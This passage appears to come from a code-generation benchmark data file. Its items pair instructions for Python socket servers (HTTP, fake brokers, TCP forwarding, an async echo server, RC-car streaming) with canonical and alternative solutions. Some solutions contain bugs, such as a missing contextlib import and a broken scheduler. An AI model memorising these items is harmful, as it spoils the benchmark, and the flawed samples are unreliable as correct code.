send(self, data: Union[str, bytes]) -> bytes:\n        if isinstance(data, str):\n            data = data.encode()\n        self.sock.connect(('localhost', self.port))\n        self.sock.sendall(data)\n        return self.sock.recv(1024)\n\n    def close(self) -> None:\n        self.sock.close()\n\n    def __del__(self):\n        self.close()"
  },
  {
    "Task_id": 404,
    "Instruction": "Task Description: Implement a simple HTTP server using TCP sockets in Python that can handle basic GET and HEAD requests, send appropriate responses, and stream data to connected clients.\n\nClass Description: HTTPServer is a TCP-based HTTP server implementation that handles incoming client connections, processes HTTP requests, and manages data streaming to clients.\n\nAttributes:\n- socket: [socket.socket] - The TCP socket object used for server operations\n- conn: [socket.socket] - The active client connection socket\n- host: [str] - The server's host address (None if bound to all interfaces)\n- port: [int] - The server's listening port\n- bound: [bool] - Flag indicating whether the server is bound to an address\n\nMethods:\n- bind(host=\"127.0.0.1\", port=0) -> None - Binds the server to the specified host and port. If port is 0, uses an available port. Sets up listening socket.\n- open(timeout=30) -> HTTPRequest - Accepts an incoming connection, processes the HTTP request, and returns the parsed request object. Times out after specified seconds.\n- write(data) -> None - Sends data to the connected client. Raises IOError if no active connection.\n- close(client_only=False) -> None - Closes the client connection and optionally the server socket. If client_only is True, keeps server socket open.\n\nHelper Class Description: HTTPRequest is used to parse incoming HTTP requests from raw request text.\n\nAttributes:\n- rfile: [BytesIO] - Buffer containing the request data\n- raw_requestline: [bytes] - The first line of the HTTP request\n- error_code: [int] - Error code if request parsing failed\n- error_message: [str] - Error message if request parsing failed\n- command: [str] - The HTTP method (e.g., \"GET\", \"HEAD\") from parsed request\n\nMethods:\n- parse_request() -> None - Parses the HTTP request (inherited from BaseHTTPRequestHandler)\n- send_error(code, message) -> None - Stores error information when request parsing fails",
    "Canonical_solution": "import socket\nfrom io import BytesIO\ntry:\n    from BaseHTTPServer import BaseHTTPRequestHandler\nexcept ImportError:\n    from http.server import BaseHTTPRequestHandler\n\nclass HTTPRequest(BaseHTTPRequestHandler):\n    def __init__(self, request_text):\n        self.rfile = BytesIO(request_text)\n        self.raw_requestline = self.rfile.readline()\n        self.error_code = self.error_message = None\n        self.parse_request()\n\n    def send_error(self, code, message):\n        self.error_code = code\n        self.error_message = message\n\nclass HTTPServer:\n    def __init__(self):\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.conn = self.host = self.port = None\n        self.bound = False\n\n    def bind(self, host=\"127.0.0.1\", port=0):\n        try:\n            self.socket.bind((host or \"\", port))\n        except socket.error as err:\n            raise OSError(err)\n\n        self.socket.listen(1)\n        self.bound = True\n        self.host, self.port = self.socket.getsockname()\n        if self.host == \"0.0.0.0\":\n            self.host = None\n\n    def open(self, timeout=30):\n        self.socket.settimeout(timeout)\n\n        try:\n            conn, addr = self.socket.accept()\n            conn.settimeout(None)\n        except socket.timeout:\n            raise OSError(\"Socket accept timed out\")\n\n        try:\n            req_data = conn.recv(1024)\n        except socket.error:\n            raise OSError(\"Failed to read data from socket\")\n\n        req = HTTPRequest(req_data)\n        if req.command not in (\"GET\", \"HEAD\"):\n            conn.send(b\"HTTP/1.1 501 Not Implemented\\r\\n\")\n            conn.close()\n            raise OSError(\"Invalid request method: {0}\".format(req.command))\n\n        try:\n            conn.send(b\"HTTP/1.1 200 OK\\r\\n\")\n            conn.send(b\"Server: Livestreamer\\r\\n\")\n            conn.send(b\"Content-Type: video/unknown\\r\\n\")\n            conn.send(b\"\\r\\n\")\n        except socket.error:\n            raise OSError(\"Failed to write data to socket\")\n\n        if req.command == \"HEAD\":\n            conn.close()\n            raise OSError\n\n        self.conn = conn\n        return req\n\n    def write(self, data):\n        if not self.conn:\n            raise IOError(\"No connection\")\n        self.conn.sendall(data)\n\n    def close(self, client_only=False):\n        if self.conn:\n            self.conn.close()\n        if not client_only:\n            self.socket.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport io\nfrom http.server import BaseHTTPRequestHandler\n\nclass HTTPRequest:\n    def __init__(self, request_text=b''):\n        self.rfile = io.BytesIO(request_text)\n        self.raw_requestline = self.rfile.readline()\n        self.error_code = 0\n        self.error_message = ''\n        self.command = ''\n        self.parse_request()\n\n    def parse_request(self):\n        try:\n            if not self.raw_requestline:\n                self.send_error(400, \"Bad request line\")\n                return False\n            \n            request_line = self.raw_requestline.decode('iso-8859-1')\n            words = request_line.split()\n            \n            if len(words) != 3:\n                self.send_error(400, \"Bad request line\")\n                return False\n                \n            self.command, path, version = words\n            return True\n            \n        except Exception as e:\n            self.send_error(500, f\"Server error: {str(e)}\")\n            return False\n\n    def send_error(self, code, message):\n        self.error_code = code\n        self.error_message = message\n\nclass HTTPServer:\n    def __init__(self):\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.conn = None\n        self.host = None\n        self.port = None\n        self.bound = False\n\n    def bind(self, host=\"127.0.0.1\", port=0):\n        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.socket.bind((host, port))\n        self.host, self.port = self.socket.getsockname()\n        self.socket.listen(5)\n        self.bound = True\n\n    def open(self, timeout=30):\n        self.socket.settimeout(timeout)\n        try:\n            self.conn, addr = self.socket.accept()\n            self.conn.settimeout(None)\n            \n            # Read the request\n            request_data = b''\n            while True:\n                data = self.conn.recv(1024)\n                if not data or data.endswith(b'\\r\\n\\r\\n'):\n                    break\n                request_data += data\n            \n            return HTTPRequest(request_data)\n        except socket.timeout:\n            return None\n\n    def write(self, data):\n        if not self.conn:\n            raise IOError(\"No active client connection\")\n        self.conn.sendall(data)\n\n    def close(self, client_only=False):\n        if self.conn:\n            self.conn.close()\n            self.conn = None\n        if not client_only and self.socket:\n            self.socket.close()"
  },
  {
    "Task_id": 405,
    "Instruction": "Task Description: Create a TCP server implementation in Python that can handle client connections, send/receive data, and manage socket resources properly. The implementation should support both TCP and Unix domain sockets, with proper error handling and cleanup.\n\nClass Description: FakeBroker is a class that simulates a message broker server capable of handling client connections over TCP or Unix domain sockets. It provides methods to start listening, accept connections, send/receive data, and clean up resources.\n\nAttributes:\n- _sock: [socket.socket] - The underlying socket object used for listening\n- _conn: [socket.socket] - The active client connection socket\n- port: [int] - The port number the server is bound to (for TCP)\n- transport: [str] - The transport type ('tcp' or 'unix')\n\nMethods:\n- __init__(transport: str = \"tcp\") -> None - Initializes the server with specified transport type (TCP or Unix domain socket)\n- start() -> None - Starts listening and accepts a client connection\n- finish() -> None - Closes all connections and cleans up resources\n- receive_packet(num_bytes: int) -> bytes - Receives specified number of bytes from client\n- send_packet(packet_out: bytes) -> int - Sends data to the connected client, returns number of bytes sent\n\nTask Description: Create a threaded TCP server implementation in Python that can handle multiple client connections simultaneously using Python's socketserver framework.\n\nClass Description: FakeWebsocketBroker is a threaded TCP server implementation that extends threading.Thread to run a server in a separate thread. It uses ThreadedTCPServer to handle multiple client connections concurrently.\n\nAttributes:\n- host: [str] - The host address to bind to (default 'localhost')\n- port: [int] - The port number the server is bound to\n- _server: [ThreadedTCPServer] - The underlying threaded TCP server instance\n- _running: [bool] - Flag indicating if the server is running\n- handler_cls: [bool/class] - The request handler class for the server\n\nMethods:\n- __init__() -> None - Initializes the threaded server\n- serve(tcphandler: class) -> contextmanager - Context manager that starts the server with given handler class\n- run() -> None - Thread entry point that starts serving requests",
    "Canonical_solution": "import socket\nimport os\nimport threading\nimport socketserver\n\nclass FakeBroker:\n    def __init__(self, transport=\"tcp\"):\n        if transport == \"tcp\":\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            sock.bind((\"localhost\", 0))\n            self.port = sock.getsockname()[1]\n        elif transport == \"unix\":\n            sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n            sock.bind(\"localhost\")\n            self.port = 1883\n        else:\n            raise ValueError(f\"unsupported transport {transport}\")\n\n        sock.settimeout(5)\n        sock.listen(1)\n\n        self._sock = sock\n        self._conn = None\n        self.transport = transport\n\n    def start(self):\n        if self._sock is None:\n            raise ValueError('Socket is not open')\n\n        (conn, address) = self._sock.accept()\n        conn.settimeout(5)\n        self._conn = conn\n\n    def finish(self):\n        if self._conn is not None:\n            self._conn.close()\n            self._conn = None\n\n        if self._sock is not None:\n            self._sock.close()\n            self._sock = None\n\n        if self.transport == 'unix':\n            try:\n                os.unlink('localhost')\n            except OSError:\n                pass\n\n    def receive_packet(self, num_bytes):\n        if self._conn is None:\n            raise ValueError('Connection is not open')\n\n        packet_in = self._conn.recv(num_bytes)\n        return packet_in\n\n    def send_packet(self, packet_out):\n        if self._conn is None:\n            raise ValueError('Connection is not open')\n\n        count = self._conn.send(packet_out)\n        return count\n\nclass ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n    pass\n\nclass FakeWebsocketBroker(threading.Thread):\n    def __init__(self):\n        super().__init__()\n        self.host = \"localhost\"\n        self.port = -1\n        self._server = None\n        self._running = True\n        self.handler_cls = False\n\n    @contextlib.contextmanager\n    def serve(self, tcphandler):\n        self._server = ThreadedTCPServer((self.host, 0), tcphandler)\n        try:\n            self.start()\n            self.port = self._server.server_address[1]\n            if not self._running:\n                raise RuntimeError(\"Error starting server\")\n            yield\n        finally:\n            if self._server:\n                self._server.shutdown()\n                self._server.server_close()\n\n    def run(self):\n        self._running = True\n        self._server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport threading\nimport contextlib\nfrom socketserver import TCPServer, BaseRequestHandler, ThreadingMixIn\n\nclass FakeBroker:\n    def __init__(self, transport: str = \"tcp\") -> None:\n        self._sock: socket.socket = None\n        self._conn: socket.socket = None\n        self.port: int = 0\n        self.transport: str = transport\n\n    def start(self) -> None:\n        if self.transport == \"tcp\":\n            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            self._sock.bind((\"localhost\", 0))\n            self.port = self._sock.getsockname()[1]\n        elif self.transport == \"unix\":\n            self._sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n            self._sock.bind(\"/tmp/fakebroker.sock\")\n        else:\n            raise ValueError(f\"Unsupported transport type: {self.transport}\")\n        \n        self._sock.listen(1)\n\n        try:\n            self._conn, _ = self._sock.accept()\n        except Exception:\n            self._sock.close()\n            raise\n\n    def finish(self) -> None:\n        if self._conn:\n            self._conn.close()\n            self._conn = None\n        if self._sock:\n            self._sock.close()\n            self._sock = None\n\n    def receive_packet(self, num_bytes: int) -> bytes:\n        try:\n            return self._conn.recv(num_bytes)\n        except ConnectionError:\n            self.finish()\n            raise\n\n    def send_packet(self, packet_out: bytes) -> int:\n        try:\n            return self._conn.sendall(packet_out)\n        except ConnectionError:\n            self.finish()\n            raise\n        return len(packet_out)\n\n\nclass ThreadedTCPServer(ThreadingMixIn, TCPServer):\n    pass\n\n\nclass FakeWebsocketBroker(threading.Thread):\n    def __init__(self) -> None:\n        super().__init__()\n        self.host: str = \"localhost\"\n        self.port: int = 0\n        self._server: ThreadedTCPServer = None\n        self._running: bool = False\n        self.handler_cls: BaseRequestHandler = None\n\n    @contextlib.contextmanager\n    def serve(self, tcphandler: BaseRequestHandler) -> None:\n        self.handler_cls = tcphandler\n        self.start()\n        try:\n            while not hasattr(self, '_server') or not self._server:\n                pass\n            yield\n        finally:\n            self.stop()\n\n    def run(self) -> None:\n        class RequestHandler(BaseRequestHandler):\n            def handle(s):\n                return self.handler_cls.handle(s)\n\n        server = ThreadedTCPServer((self.host, 0), RequestHandler)\n        self._server = server\n        self.port = server.server_address[1]\n        self._running = True\n        server.serve_forever()\n\n    def stop(self) -> None:\n        if self._server:\n            self._server.shutdown()\n            self._server.server_close()\n        self._running = False"
  },
  {
    "Task_id": 406,
    "Instruction": "Task Description: Implement a TCP forwarding server that acts as an intermediary between client connections and a remote device, facilitating bidirectional communication between them.\n\nClass Description: TCPForwardServer is a class that establishes a TCP server to forward traffic between connected clients and a remote device. It manages multiple client connections simultaneously using select-based I/O multiplexing and maintains channel mappings between client and device sockets.\n\nAttributes:\n- input_list: List[socket.socket] - List of sockets being monitored for incoming data\n- channel: Dict[socket.socket, socket.socket] - Mapping between client and device sockets\n- _server: socket.socket - The main server socket accepting client connections\n- _rdev: Device - The remote device to connect to\n- _rport: int - The port number on the remote device\n- BUFFER_SIZE: int - Size of the data buffer for socket operations\n- DELAY: float - Delay between select operations in seconds\n\nMethods:\n- __init__(lhost: str, lport: int, rdev: Device, rport: int) -> None - Initializes the TCP forwarding server with local host/port and remote device/port information\n- main_loop() -> None - Main server loop that handles incoming connections and data using select\n- on_accept() -> None - Handles new client connections and establishes corresponding device connections\n- on_close() -> None - Cleans up resources when a connection is closed\n- on_recv() -> None - Handles incoming data by forwarding it to the corresponding channel",
    "Canonical_solution": "import socket\nimport select\nimport time\nfrom typing import Dict\n\nclass TCPForwardServer:\n    def __init__(self, lhost: str, lport: int, rdev: Device, rport: int):\n        self.input_list = []\n        self.channel: Dict[socket.socket, socket.socket] = {}\n        \n        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self._server.bind((lhost, lport))\n        self._server.listen(200)\n        self._rdev = rdev\n        self._rport = rport\n        self.BUFFER_SIZE = 4096\n        self.DELAY = 0.0001\n    \n    def main_loop(self):\n        self.input_list.append(self._server)\n        while True:\n            time.sleep(self.DELAY)\n            inputready, _, _ = select.select(self.input_list, [], [])\n            for self.s in inputready:\n                if self.s == self._server:\n                    self.on_accept()\n                    break\n                self.data = self.s.recv(self.BUFFER_SIZE)\n                if len(self.data) == 0:\n                    self.on_close()\n                else:\n                    self.on_recv()\n\n    def on_accept(self):\n        try:\n            sock_proxy = self._rdev.create_inner_connection(self._rport)\n            devicesock = sock_proxy.get_socket()\n        except Exception:\n            devicesock = None\n\n        clientsock, clientaddr = self._server.accept()\n        if devicesock:\n            print(clientaddr, \"has connected\")\n            self.input_list.append(clientsock)\n            self.input_list.append(devicesock)\n            self.channel[clientsock] = devicesock\n            self.channel[devicesock] = clientsock\n        else:\n            print(\"Can't establish connection with device inner server.\")\n            print(\"Closing connection with client side\", clientaddr)\n            clientsock.close()\n        \n    def on_close(self):\n        print(self.s.getpeername(), \"has disconnected\")\n        self.input_list.remove(self.s)\n        self.input_list.remove(self.channel[self.s])\n        out = self.channel[self.s]\n        self.channel[out].close()\n        self.channel[self.s].close()\n        del self.channel[out]\n        del self.channel[self.s]\n    \n    def on_recv(self):\n        data = self.data\n        self.channel[self.s].send(data)",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport select\nfrom typing import List, Dict\nfrom device_module import Device\n\nclass TCPForwardServer:\n    def __init__(self, lhost: str, lport: int, rdev: Device, rport: int) -> None:\n        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self._server.bind((lhost, lport))\n        self._server.listen(200)\n        self.input_list: List[socket.socket] = [self._server]\n        self.channel: Dict[socket.socket, socket.socket] = {}\n        self._rdev: Device = rdev\n        self._rport: int = rport\n        self.BUFFER_SIZE: int = 4096\n        self.DELAY: float = 0.05\n\n    def main_loop(self) -> None:\n        while True:\n            readable, writable, exceptional = select.select(self.input_list, [], [])\n            for sock in readable:\n                if sock is self._server:\n                    self.on_accept()\n                else:\n                    data = sock.recv(self.BUFFER_SIZE)\n                    if data:\n                        self.on_recv(sock, data)\n                    else:\n                        self.on_close(sock)\n\n    def on_accept(self) -> None:\n        client_socket, client_addr = self._server.accept()\n        device_socket = self._rdev.connect(self._rport)\n        if device_socket:\n            self.input_list.append(client_socket)\n            self.input_list.append(device_socket)\n            self.channel[client_socket] = device_socket\n            self.channel[device_socket] = client_socket\n\n    def on_close(self, sock: socket.socket) -> None:\n        other = self.channel.get(sock)\n        if other:\n            other.close()\n            self.input_list.remove(other)\n            del self.channel[other]\n        sock.close()\n        self.input_list.remove(sock)\n        del self.channel[sock]\n\n    def on_recv(self, sock: socket.socket, data: bytes) -> None:\n        other = self.channel.get(sock)\n        if other:\n            other.sendall(data)"
  },
  {
    "Task_id": 407,
    "Instruction": "Task Description: Implement a TCP server using Python's socket module with asynchronous I/O operations managed by a custom scheduler. The server should handle multiple client connections, echo received data back to clients, and properly manage socket resources.\n\nClass Description: The implementation consists of several classes that work together to create an asynchronous TCP server. The main classes include Socket (a wrapper for socket operations), ReadSocket/WriteSocket/AcceptSocket (operation handlers), and EchoServer (the main server logic).\n\nAttributes:\n\n- Socket._sock: socket.socket - The underlying socket object being wrapped\n- ReadSocket.sock: socket.socket - The socket to read from\n- ReadSocket.nbytes: int - Maximum bytes to read\n- WriteSocket.sock: socket.socket - The socket to write to\n- WriteSocket.data: bytes - Data to be sent\n- AcceptSocket.sock: socket.socket - The socket to accept connections from\n- EchoServer.sched: object - The scheduler instance managing tasks\n\nMethods:\n\n- Socket.__init__(sock: socket.socket) -> None - Initialize with a socket object\n- Socket.recv(maxbytes: int) -> ReadSocket - Create a read operation\n- Socket.send(data: bytes) -> WriteSocket - Create a write operation\n- Socket.accept() -> AcceptSocket - Create an accept operation\n- Socket.__getattr__(name: str) -> Any - Proxy attribute access to underlying socket\n- ReadSocket.handle_yield(sched: object, task: object) -> None - Register read operation with scheduler\n- ReadSocket.handle_resume(sched: object, task: object) -> None - Complete read operation\n- WriteSocket.handle_yield(sched: object, task: object) -> None - Register write operation with scheduler\n- WriteSocket.handle_resume(sched: object, task: object) -> None - Complete write operation\n- AcceptSocket.handle_yield(sched: object, task: object) -> None - Register accept operation with scheduler\n- AcceptSocket.handle_resume(sched: object, task: object) -> None - Complete accept operation\n- EchoServer.__init__(addr: tuple, sched: object) -> None - Initialize server with address and scheduler\n- EchoServer.server_loop(addr: tuple) -> generator - Main server loop accepting connections\n- EchoServer.client_handler(client: Socket) -> generator - Handle client communication",
    "Canonical_solution": "from collections import deque\nfrom select import select\nfrom socket import socket, AF_INET, SOCK_STREAM\n\nclass Socket:\n    def __init__(self, sock):\n        self._sock = sock\n    \n    def recv(self, maxbytes):\n        return ReadSocket(self._sock, maxbytes)\n    \n    def send(self, data):\n        return WriteSocket(self._sock, data)\n    \n    def accept(self):\n        return AcceptSocket(self._sock)\n    \n    def __getattr__(self, name):\n        return getattr(self._sock, name)\n\nclass ReadSocket:\n    def __init__(self, sock, nbytes):\n        self.sock = sock\n        self.nbytes = nbytes\n    \n    def handle_yield(self, sched, task):\n        sched._read_wait(self.sock.fileno(), self, task)\n    \n    def handle_resume(self, sched, task):\n        data = self.sock.recv(self.nbytes)\n        sched.add_ready(task, data)\n\nclass WriteSocket:\n    def __init__(self, sock, data):\n        self.sock = sock\n        self.data = data\n    \n    def handle_yield(self, sched, task):\n        sched._write_wait(self.sock.fileno(), self, task)\n    \n    def handle_resume(self, sched, task):\n        nsent = self.sock.send(self.data)\n        sched.add_ready(task, nsent)\n\nclass AcceptSocket:\n    def __init__(self, sock):\n        self.sock = sock\n    \n    def handle_yield(self, sched, task):\n        sched._read_wait(self.sock.fileno(), self, task)\n    \n    def handle_resume(self, sched, task):\n        r = self.sock.accept()\n        sched.add_ready(task, r)\n\nclass EchoServer:\n    def __init__(self, addr, sched):\n        self.sched = sched\n        sched.new(self.server_loop(addr))\n    \n    def server_loop(self, addr):\n        s = Socket(socket(AF_INET, SOCK_STREAM))\n        s.bind(addr)\n        s.listen(5)\n        while True:\n            c, a = yield s.accept()\n            print('Got connection from', a)\n            self.sched.new(self.client_handler(Socket(c)))\n    \n    def client_handler(self, client):\n        while True:\n            line = yield from readline(client)\n            if not line:\n                break\n            line = b'GOT:' + line\n            while line:\n                nsent = yield client.send(line)\n                line = line[nsent:]\n        client.close()\n        print('Client closed')",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport select\n\nclass Socket:\n    def __init__(self, sock):\n        self._sock = sock\n    \n    def recv(self, maxbytes):\n        return ReadSocket(self._sock, maxbytes)\n    \n    def send(self, data):\n        return WriteSocket(self._sock, data)\n    \n    def accept(self):\n        return AcceptSocket(self._sock)\n    \n    def __getattr__(self, name):\n        return getattr(self._sock, name)\n\nclass ReadSocket:\n    def __init__(self, sock, nbytes):\n        self.sock = sock\n        self.nbytes = nbytes\n    \n    def handle_yield(self, sched, task):\n        sched.wait_for_read(self.sock, task)\n    \n    def handle_resume(self, sched, task):\n        try:\n            data = self.sock.recv(self.nbytes)\n            task.send(data)\n        except Exception as e:\n            task.throw(e)\n\nclass WriteSocket:\n    def __init__(self, sock, data):\n        self.sock = sock\n        self.data = data\n    \n    def handle_yield(self, sched, task):\n        sched.wait_for_write(self.sock, task)\n    \n    def handle_resume(self, sched, task):\n        try:\n            self.sock.sendall(self.data)\n            task.send(None)\n        except Exception as e:\n            task.throw(e)\n\nclass AcceptSocket:\n    def __init__(self, sock):\n        self.sock = sock\n    \n    def handle_yield(self, sched, task):\n        sched.wait_for_read(self.sock, task)\n    \n    def handle_resume(self, sched, task):\n        try:\n            client, addr = self.sock.accept()\n            task.send(Socket(client))\n        except Exception as e:\n            task.throw(e)\n\nclass Scheduler:\n    def __init__(self):\n        self.read_waiters = {}\n        self.write_waiters = {}\n        self.numtasks = 0\n    \n    def wait_for_read(self, sock, task):\n        self.read_waiters[sock.fileno()] = (sock, task)\n    \n    def wait_for_write(self, sock, task):\n        self.write_waiters[sock.fileno()] = (sock, task)\n    \n    def run(self):\n        while self.read_waiters or self.write_waiters:\n            rlist, wlist, _ = [], [], []\n            rlist.extend(waiter[0] for waiter in self.read_waiters.values())\n            wlist.extend(waiter[0] for waiter in self.write_waiters.values())\n            \n            ready_to_read, ready_to_write, _ = select.select(rlist, wlist, [])\n            \n            for fd in ready_to_read:\n                sock, task = self.read_waiters.pop(fd)\n                op = task.send(None)\n                if isinstance(op, ReadSocket):\n                    op.handle_resume(self, task)\n            \n            for fd in ready_to_write:\n                sock, task = self.write_waiters.pop(fd)\n                op = task.send(None)\n                if isinstance(op, WriteSocket):\n                    op.handle_resume(self, task)\n    \n    def new(self, task):\n        self.numtasks += 1\n        def wrapper():\n            try:\n                op = next(task)\n                while True:\n                    if isinstance(op, ReadSocket):\n                        op.handle_yield(self, task)\n                    elif isinstance(op, WriteSocket):\n                        op.handle_yield(self, task)\n                    elif isinstance(op, AcceptSocket):\n                        op.handle_yield(self, task)\n                    else:\n                        raise ValueError(f\"Unknown operation: {op}\")\n                    op = yield\n            except StopIteration:\n                self.numtasks -= 1\n        return wrapper()\n\nclass EchoServer:\n    def __init__(self, addr, sched):\n        self.sched = sched\n        self.addr = addr\n    \n    def server_loop(self, addr):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sock.bind(addr)\n        sock.listen(5)\n        sock_wrapper = Socket(sock)\n        \n        while True:\n            client = yield sock_wrapper.accept()\n            self.sched.new(self.client_handler(client))\n    \n    def client_handler(self, client):\n        try:\n            while True:\n                data = yield client.recv(65536)\n                if not data:\n                    break\n                yield client.send(data)\n        finally:\n            client.close()"
  },
  {
    "Task_id": 409,
    "Instruction": "Task Description: Create a TCP server that handles both video streaming and sensor data processing concurrently, using separate ports for each type of data. The server should process video frames for object detection and control an RC car based on sensor inputs and detected objects.\n\nClass Description: Server - A class that manages two TCP servers running on different ports, one for video stream processing and another for sensor data handling. It uses multithreading to handle both servers concurrently.\n\nAttributes:\n- host: str - The host address where the server will run.\n- port1: int - The port number for the video stream server.\n- port2: int - The port number for the sensor data server.\n\nMethods:\n- video_stream(host: str, port: int) -> None - Starts a TCP server for video stream processing using the VideoStreamHandler class.\n- sensor_stream(host: str, port: int) -> None - Starts a TCP server for sensor data processing using the SensorDataHandler class.\n- start() -> None - Initializes and starts both servers in separate threads, with the sensor server running as a daemon thread.\n\nClass Description: VideoStreamHandler - A handler class for processing video streams, inheriting from socketserver.StreamRequestHandler. It performs object detection and controls an RC car based on the processed video frames and sensor data.\n\nAttributes:\n- nn: NeuralNetwork - A neural network model for image prediction.\n- obj_detection: ObjectDetection - An object detection utility.\n- rc_car: RCControl - An interface for controlling the RC car.\n- stop_cascade: cv2.CascadeClassifier - A classifier for detecting stop signs.\n- light_cascade: cv2.CascadeClassifier - A classifier for detecting traffic lights.\n- d_to_camera: DistanceToCamera - A utility for calculating distances to detected objects.\n- d_sensor_thresh: int - Threshold distance for sensor-based stopping.\n- d_stop_light_thresh: int - Threshold distance for stop sign and traffic light detection.\n- d_stop_sign: float - Current distance to the nearest stop sign.\n- d_light: float - Current distance to the nearest traffic light.\n- stop_start: int - Timestamp when stopping begins.\n- stop_finish: int - Timestamp when stopping ends.\n- stop_time: float - Duration of the stop.\n- drive_time_after_stop: float - Time driven after a stop.\n\nMethods:\n- __init__(request, client_address, server) -> None - Initializes the handler with necessary models and parameters.\n- handle() -> None - Processes incoming video stream, performs object detection, and controls the RC car based on the detected objects and sensor data.\n\nClass Description: SensorDataHandler - A handler class for processing sensor data, inheriting from socketserver.BaseRequestHandler. It reads and processes sensor data received from the client.\n\nAttributes: None\n\nMethods:\n- handle() -> None - Continuously reads sensor data from the client, updates the global sensor_data variable, and prints the received data.",
    "Canonical_solution": "import cv2\nimport sys\nimport threading\nimport socketserver\nimport numpy as np\n\nclass SensorDataHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        global sensor_data\n        while True:\n            data = self.request.recv(1024)\n            if not data:\n                break\n            sensor_data = round(float(data), 1)\n            print(sensor_data)\n\nclass VideoStreamHandler(socketserver.StreamRequestHandler):\n    def __init__(self, request, client_address, server):\n        self.nn = NeuralNetwork()\n        self.nn.load_model(\"saved_model/nn_model.xml\")\n        self.obj_detection = ObjectDetection()\n        self.rc_car = RCControl(\"/dev/tty.usbmodem1421\")\n        self.stop_cascade = cv2.CascadeClassifier(\"cascade_xml/stop_sign.xml\")\n        self.light_cascade = cv2.CascadeClassifier(\"cascade_xml/traffic_light.xml\")\n        self.d_to_camera = DistanceToCamera()\n        self.d_sensor_thresh = 30\n        self.d_stop_light_thresh = 25\n        self.d_stop_sign = self.d_stop_light_thresh\n        self.d_light = self.d_stop_light_thresh\n        self.stop_start = 0\n        self.stop_finish = 0\n        self.stop_time = 0\n        self.drive_time_after_stop = 0\n        super().__init__(request, client_address, server)\n\n    def handle(self):\n        global sensor_data\n        stream_bytes = b' '\n        stop_flag = False\n        stop_sign_active = True\n\n        try:\n            while True:\n                stream_bytes += self.rfile.read(1024)\n                first = stream_bytes.find(b'\\xff\\xd8')\n                last = stream_bytes.find(b'\\xff\\xd9')\n                if first != -1 and last != -1:\n                    jpg = stream_bytes[first:last + 2]\n                    stream_bytes = stream_bytes[last + 2:]\n                    gray = cv2.imdecode(np.frombuffer(jpg, dtype=np.uint8), cv2.IMREAD_GRAYSCALE)\n                    image = cv2.imdecode(np.frombuffer(jpg, dtype=np.uint8), cv2.IMREAD_COLOR)\n\n                    height, width = gray.shape\n                    roi = gray[int(height/2):height, :]\n\n                    v_param1 = self.obj_detection.detect(self.stop_cascade, gray, image)\n                    v_param2 = self.obj_detection.detect(self.light_cascade, gray, image)\n\n                    if v_param1 > 0 or v_param2 > 0:\n                        d1 = self.d_to_camera.calculate(v_param1, 5.5, 300, image)\n                        d2 = self.d_to_camera.calculate(v_param2, 5.5, 100, image)\n                        self.d_stop_sign = d1\n                        self.d_light = d2\n\n                    image_array = roi.reshape(1, int(height/2) * width).astype(np.float32)\n                    prediction = self.nn.predict(image_array)\n\n                    if sensor_data and int(sensor_data) < self.d_sensor_thresh:\n                        self.rc_car.stop()\n                        sensor_data = None\n                    elif 0 < self.d_stop_sign < self.d_stop_light_thresh and stop_sign_active:\n                        self.rc_car.stop()\n                        if not stop_flag:\n                            self.stop_start = cv2.getTickCount()\n                            stop_flag = True\n                        self.stop_finish = cv2.getTickCount()\n                        self.stop_time = (self.stop_finish - self.stop_start) / cv2.getTickFrequency()\n                        if self.stop_time > 5:\n                            stop_flag = False\n                            stop_sign_active = False\n                    elif 0 < self.d_light < self.d_stop_light_thresh:\n                        if self.obj_detection.red_light:\n                            self.rc_car.stop()\n                        self.d_light = self.d_stop_light_thresh\n                        self.obj_detection.red_light = False\n                    else:\n                        self.rc_car.steer(prediction)\n                        self.stop_start = cv2.getTickCount()\n                        self.d_stop_sign = self.d_stop_light_thresh\n                        if not stop_sign_active:\n                            self.drive_time_after_stop = (self.stop_start - self.stop_finish) / cv2.getTickFrequency()\n                            if self.drive_time_after_stop > 5:\n                                stop_sign_active = True\n\n                    if cv2.waitKey(1) & 0xFF == ord('q'):\n                        self.rc_car.stop()\n                        break\n        finally:\n            cv2.destroyAllWindows()\n            sys.exit()\n\nclass Server:\n    def __init__(self, host, port1, port2):\n        self.host = host\n        self.port1 = port1\n        self.port2 = port2\n\n    def video_stream(self, host, port):\n        s = socketserver.TCPServer((host, port), VideoStreamHandler)\n        s.serve_forever()\n\n    def sensor_stream(self, host, port):\n        s = socketserver.TCPServer((host, port), SensorDataHandler)\n        s.serve_forever()\n\n    def start(self):\n        sensor_thread = threading.Thread(target=self.sensor_stream, args=(self.host, self.port2))\n        sensor_thread.daemon = True\n        sensor_thread.start()\n        self.video_stream(self.host, self.port1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
